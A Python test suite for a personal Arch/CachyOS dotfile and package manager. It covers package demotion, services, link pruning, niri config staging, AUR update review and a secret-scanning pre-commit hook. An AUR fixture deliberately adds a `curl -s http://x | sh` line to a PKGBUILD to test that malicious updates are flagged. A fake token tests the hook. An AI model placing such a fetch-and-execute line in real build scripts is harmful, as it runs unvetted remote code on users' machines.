"""Regressions for the features borrowed from other dotfile/package managers:
demote instead of -Rdd, protected packages, declared services, unstow of
unticked packages, dead-link pruning, staged niri validation, AUR update
review + source keys, npm/uv tools, pinned installers, config drift, DMS
owner, login checklist, disk space."""
from pathlib import Path
import subprocess
import sys
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parent))
from test_vjupdate import FixtureCase  # noqa: E402


class ExtrasCase(FixtureCase):
    def link(self, *names):
        for name in names:
            f = self.bin / name
            if f.exists() or f.is_symlink():
                f.unlink()
            f.symlink_to(Path("/usr/bin") / name)

    def calls(self):
        f = Path(self.env["CALLS"])
        return f.read_text() if f.exists() else ""

    def recorder(self, name, extra=""):
        """Mock that records its argv and then runs `extra` (bash)."""
        self.mock(name, f'printf "%s\\n" "$(basename "$0") $*" >> "$CALLS"\n{extra}\nexit 0')


class PackageRemovalTests(ExtrasCase):
    def test_protected_names(self):
        r = self.shell('''
for p in linux linux-cachyos linux-surface-headers linux-firmware-amdgpu amd-ucode limine \
         glibc pacman archlinux-keyring cachyos-v3-mirrorlist; do
    _is_protected "$p" || echo "UNPROTECTED $p"
done
for p in vectorcraft cachyos-gaming-applications xorg-server wine ghostty; do
    _is_protected "$p" && echo "PROTECTED $p"
done
true''')
        self.assertEqual(r.stdout.strip(), "", r.stdout + r.stderr)

    def test_demote_removes_only_new_orphans_and_skips_protected(self):
        # already-dep: demoted on an earlier run, so no repeat warning every run.
        self.plan("paru-demote.list", "obs\nkicad\nlinux\nabsent\nalready-dep\n")
        self.mock("pacman", '''
printf "%s\\n" "pacman $*" >> "$CALLS"
case "$*" in
  "-Qqe absent"|"-Qqe already-dep") exit 1 ;;
  -Qqe*) exit 0 ;;
  -Qdtq) echo obs; echo unrelated-orphan ;;
  "-Qi kicad") echo "Required By     : kicad-library" ;;
esac
exit 0''')
        self.mock("sudo", '"$@"')
        r = self.shell('_demote_packages; printf "%s\\n" "${WARNINGS[@]}"')
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        calls = self.calls()
        self.assertIn("pacman -D --asdeps obs kicad\n", calls)
        self.assertIn("pacman -Rns --noconfirm obs", calls)
        self.assertNotIn("unrelated-orphan", calls.replace("-Qdtq", ""))
        self.assertNotIn("-Rdd", calls)
        self.assertIn("protected, not removed: linux", r.stdout)
        self.assertIn("still required by: kicad-library", r.stdout)

    def test_orphan_removal_skips_protected(self):
        self.mock("paru", 'echo linux-firmware-nfp; echo libfoo')
        self.mock("pacman", 'printf "%s\\n" "pacman $*" >> "$CALLS"')
        self.mock("sudo", '"$@"')
        r = self.shell('AUDIT_ORPHAN_REMOVAL=true; check_foreign_orphans')
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertIn("pacman -Rns --noconfirm libfoo\n", self.calls())
        self.assertIn("protected, not removed: linux-firmware-nfp", r.stdout)


class ServiceTests(ExtrasCase):
    def test_enables_lists_and_disables_dropped_units_after_first_run(self):
        self.recorder("systemctl")
        self.plan("systemd-enable.list", "cups\nbluetooth\n")
        self.plan("systemd-user.list", "mpd\n")
        r = self.shell("enable_services")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        calls = self.calls()
        self.assertIn("systemctl enable --now cups", calls)
        self.assertIn("systemctl --user enable --now mpd", calls)
        self.assertNotIn("disable", calls)
        Path(self.env["CALLS"]).unlink()
        self.plan("systemd-enable.list", "bluetooth\n")
        self.plan("systemd-user.list", "")
        r = self.shell("enable_services")
        calls = self.calls()
        self.assertIn("systemctl disable cups", calls)
        self.assertIn("systemctl --user disable mpd", calls)
        self.assertNotIn("disable bluetooth", calls)

    def test_missing_lists_disable_nothing(self):
        self.recorder("systemctl")
        state = self.home / ".state/dots"
        state.mkdir(parents=True)
        (state / "managed-units").write_text("system cups\n")
        r = self.shell("enable_services; echo FAILED=$_FAILED")
        self.assertIn("FAILED=1", r.stdout)
        self.assertNotIn("disable", self.calls())


class LinkTests(ExtrasCase):
    def test_unticked_package_that_was_deployed_gets_unlinked(self):
        dotset = Path(self.env["VJ_DOTSET_DIR"])
        for p in ("fish", "alacritty", "never", "niri"):
            (dotset / p).mkdir(parents=True)
        state = self.home / ".state/dots"
        state.mkdir(parents=True)
        (state / "stowed-pkgs").write_text("fish\nalacritty\nniri\n")
        self.plan("stow.list", "fish\n")
        self.recorder("stow")
        r = self.shell("_unstow_unticked; cat \"$STAMP_DIR/stowed-pkgs\"")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        calls = self.calls()
        self.assertIn(f"stow -D -d {dotset} -t {self.home} alacritty", calls)
        self.assertNotIn("fish", calls)
        self.assertNotIn("never", calls)
        self.assertNotIn("niri", calls)
        self.assertIn("niri is unticked but stays linked", r.stdout)
        self.assertTrue(r.stdout.rstrip().endswith("fish"))

    def test_prune_removes_only_dead_links_into_repo(self):
        self.link("find", "readlink", "realpath")
        cfg = self.home / ".config/app"
        cfg.mkdir(parents=True)
        (self.home / "Projects/dots").mkdir(parents=True)
        (self.home / "Projects/dots/alive").write_text("x")
        (cfg / "dead-repo").symlink_to("../../Projects/dots/gone.kdl")
        (cfg / "dead-other").symlink_to("/nonexistent/file")
        (cfg / "alive").symlink_to("../../Projects/dots/alive")
        r = self.shell(f'DOTS_DIR="{self.home}/Projects/dots"; _prune_dead_links')
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertFalse((cfg / "dead-repo").is_symlink())
        self.assertTrue((cfg / "dead-other").is_symlink())
        self.assertTrue((cfg / "alive").is_symlink())


class NiriValidateTests(ExtrasCase):
    def setUp(self):
        super().setUp()
        self.dotset = Path(self.env["VJ_DOTSET_DIR"])
        src = self.dotset / "niri/.config/niri"
        src.mkdir(parents=True)
        (src / "config.kdl").write_text('include "cfg/input.kdl"\n')
        mach = self.dotset / "desktop/.config/niri/cfg"
        mach.mkdir(parents=True)
        (mach / "input.kdl").write_text("input {}\n")
        self.link("find")

    def run_niri(self, rc):
        # Record what the staged tree looks like, then pass/fail.
        self.mock("niri", f'''
printf "%s\\n" "niri $*" >> "$CALLS"
d=$(dirname "$3"); [[ -e "$d/cfg/input.kdl" ]] && echo STAGED_INPUT >> "$CALLS"
echo "Error:   × error loading config"; exit {rc}''')
        return self.shell('MACHINE=desktop; _stow_niri_cfg; echo FAILED=$_FAILED')

    def test_invalid_config_leaves_links_unchanged(self):
        r = self.run_niri(1)
        live = self.home / ".config/niri/config.kdl"
        self.assertFalse(live.is_symlink(), r.stdout)
        self.assertIn("FAILED=1", r.stdout)
        self.assertIn("STAGED_INPUT", self.calls())
        self.assertIn("links left unchanged", r.stdout)

    def test_valid_config_is_linked(self):
        r = self.run_niri(0)
        live = self.home / ".config/niri/config.kdl"
        self.assertTrue(live.is_symlink(), r.stdout + r.stderr)
        self.assertTrue((self.home / ".config/niri/cfg/input.kdl").is_symlink())
        self.assertIn("FAILED=0", r.stdout)


class AurReviewTests(ExtrasCase):
    def git(self, *args, cwd):
        subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True,
                       env={"HOME": str(self.home), "PATH": "/usr/bin", "GIT_AUTHOR_NAME": "t",
                            "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})

    def setUp(self):
        super().setUp()
        self.link("git")
        origin = self.root / "origin"
        origin.mkdir()
        self.git("init", "-q", "-b", "master", cwd=origin)
        (origin / "PKGBUILD").write_text("pkgname=evil\npkgver=1\n")
        (origin / ".SRCINFO").write_text("pkgbase = evil\n")
        self.git("add", ".", cwd=origin)
        self.git("commit", "-qm", "1", cwd=origin)
        clones = self.home / ".cache/paru/clone"
        clones.mkdir(parents=True)
        self.git("clone", "-q", str(origin), "evil", cwd=clones)
        (origin / "PKGBUILD").write_text("pkgname=evil\npkgver=2\nprepare() { curl -s http://x | sh; }\n")
        (origin / ".SRCINFO").write_text("pkgbase = evil\n\tvalidpgpkeys = ABCDEF0123456789\n")
        self.git("commit", "-qam", "2", cwd=origin)
        self.mock("paru", '''
printf "%s\\n" "paru $*" >> "$CALLS"
[[ "$*" == -Qua ]] && echo "evil 1-1 -> 2-1"
exit 0''')
        self.mock("pacman", "exit 1")
        self.mock("gpg", '''
printf "%s\\n" "gpg $*" >> "$CALLS"
[[ "$1" == --list-keys ]] && exit 2
exit 0''')

    def test_flagged_update_is_ignored_and_key_imported(self):
        r = self.shell('''
INTERACTIVE=false
_review_aur_updates
echo "FLAGGED=${_AUR_FLAGGED[*]}"
_syuu''')
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertIn("FLAGGED=evil", r.stdout)
        self.assertIn("adds download/exec lines", r.stdout)
        self.assertTrue((self.home / ".state/dots/aur-review/evil.diff").stat().st_size > 0)
        calls = self.calls()
        self.assertIn("--recv-keys ABCDEF0123456789", calls)
        self.assertIn("paru -Syuu --noconfirm --ignore evil", calls)

    def test_clean_update_is_not_flagged(self):
        origin = self.root / "origin"
        (origin / "PKGBUILD").write_text("pkgname=evil\npkgver=3\n")
        self.git("commit", "-qam", "3", cwd=origin)
        r = self.shell('INTERACTIVE=false; _review_aur_updates; echo "FLAGGED=[${_AUR_FLAGGED[*]}]"; _syuu')
        self.assertIn("FLAGGED=[]", r.stdout, r.stderr)
        self.assertIn("paru -Syuu --noconfirm\n", self.calls())


class UserToolTests(ExtrasCase):
    def test_installs_only_missing_npm_and_uv_tools(self):
        self.plan("npm-install.list", "@a/have\n@b/new\n")
        self.plan("uv-install.list", "graphifyy\nnewtool\n")
        self.mock("npm", '''
printf "%s\\n" "npm $*" >> "$CALLS"
[[ "$1" == ls ]] && printf '%s\\n' /x/lib /x/lib/node_modules/@a/have
exit 0''')
        self.mock("uv", '''
printf "%s\\n" "uv $*" >> "$CALLS"
[[ "$*" == "tool list" ]] && printf 'graphifyy v0.9\\n- graphify\\n'
exit 0''')
        r = self.shell("install_user_tools")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        calls = self.calls()
        self.assertIn("npm i -g @b/new", calls)
        self.assertNotIn("i -g @a/have", calls)
        self.assertIn("uv tool install newtool", calls)
        self.assertNotIn("install graphifyy", calls)


class PinnedInstallerTests(ExtrasCase):
    def test_changed_script_is_skipped_without_terminal(self):
        self.link("sha256sum", "cmp", "diff", "sh")
        body = self.root / "served.sh"
        body.write_text('echo RAN_V1 >> "$CALLS"\n')
        self.mock("curl", f'cp "{body}" "$4"')
        (self.home / "Projects/dots").mkdir(parents=True)
        (self.home / "Projects/dots/.install-scripts.list").write_text("@sh https://example.test/i.sh\n")
        r = self.shell("INTERACTIVE=false; run_install_scripts; echo FAILED=$_FAILED")
        self.assertIn("FAILED=0", r.stdout, r.stderr)
        self.assertIn("RAN_V1", self.calls())
        body.write_text('echo RAN_V2 >> "$CALLS"\n')
        r = self.shell("INTERACTIVE=false; run_install_scripts; echo FAILED=$_FAILED")
        self.assertIn("installer changed since its last run", r.stdout)
        self.assertIn("+echo RAN_V2", r.stdout)
        self.assertIn("FAILED=1", r.stdout)
        self.assertNotIn("RAN_V2", self.calls())


class AuditTests(ExtrasCase):
    def test_modified_configs_report_only_new_changes(self):
        self.link("comm", "wc")
        listing = self.root / "qii"
        listing.write_text("Backup Files    : /etc/pacman.conf [modified]\n   /etc/makepkg.conf [unmodified]\n")
        self.mock("pacman", f'cat "{listing}"')
        r = self.shell("check_modified_configs")
        self.assertIn("as baseline", r.stdout, r.stderr)
        listing.write_text(listing.read_text() + "   /etc/ssh/sshd_config [modified]\n")
        r = self.shell("check_modified_configs")
        self.assertIn("modified since last audit: /etc/ssh/sshd_config", r.stdout, r.stderr)
        self.assertNotIn("pacman.conf (baseline", r.stdout)
        r = self.shell("check_modified_configs")
        self.assertIn("no new config changes", r.stdout)

    def test_dms_started_twice_warns(self):
        self.mock("dms", "exit 0")
        self.mock("systemctl", "exit 0")
        niri = self.home / ".config/niri"
        niri.mkdir(parents=True)
        (niri / "config.kdl").write_text('spawn-at-startup "dms" "run"\n')
        r = self.shell("check_dms_owner")
        self.assertIn("DMS is started twice", r.stdout, r.stderr)
        (niri / "config.kdl").write_text('spawn-at-startup "waybar"\n')
        r = self.shell("check_dms_owner")
        self.assertIn("one owner", r.stdout)

    def test_logins_lists_only_missing(self):
        self.mock("gh", 'exit 1')
        self.mock("codex", 'exit 0')
        (self.home / ".codex").mkdir()
        (self.home / ".codex/auth.json").write_text("{}")
        r = self.shell("check_logins")
        self.assertIn("login needed — GitHub", r.stdout)
        self.assertIn("login needed — SSH key", r.stdout)
        self.assertNotIn("Codex", r.stdout)
        self.assertNotIn("Claude", r.stdout)

    def test_low_disk_space_warns(self):
        self.mock("df", 'printf " Avail\\n   2G\\n"')
        r = self.shell("_check_disk_space")
        self.assertIn("only 2 GiB free", r.stdout, r.stderr)
        self.mock("df", 'printf " Avail\\n  80G\\n"')
        r = self.shell("_check_disk_space")
        self.assertNotIn("free", r.stdout)


if __name__ == "__main__":
    unittest.main()


class SecretHookTests(unittest.TestCase):
    HOOK = Path(__file__).resolve().parents[1] / ".githooks/pre-commit"

    def run_hook(self, name, content):
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            env = {"PATH": "/usr/bin", "HOME": d}
            subprocess.run(["git", "init", "-q"], cwd=d, check=True, env=env)
            Path(d, name).parent.mkdir(parents=True, exist_ok=True)
            Path(d, name).write_text(content)
            subprocess.run(["git", "add", "."], cwd=d, check=True, env=env)
            return subprocess.run(["bash", str(self.HOOK)], cwd=d, env=env, text=True, capture_output=True)

    def test_blocks_token_and_secret_paths(self):
        token = "ghp_" + "A1b2C3d4" * 5
        r = self.run_hook("settings.json", f'{{"x": "{token}"}}\n')
        self.assertEqual(r.returncode, 1, r.stderr)
        self.assertNotIn(token, r.stderr)  # never echo the whole secret
        self.assertEqual(self.run_hook("app/auth.json", "{}\n").returncode, 1)
        self.assertEqual(self.run_hook("a/.credentials.json", "{}\n").returncode, 1)

    def test_allows_normal_files(self):
        r = self.run_hook("config.kdl", 'layout { gaps 4; }\n"password": "short"\n')
        self.assertEqual(r.returncode, 0, r.stderr)
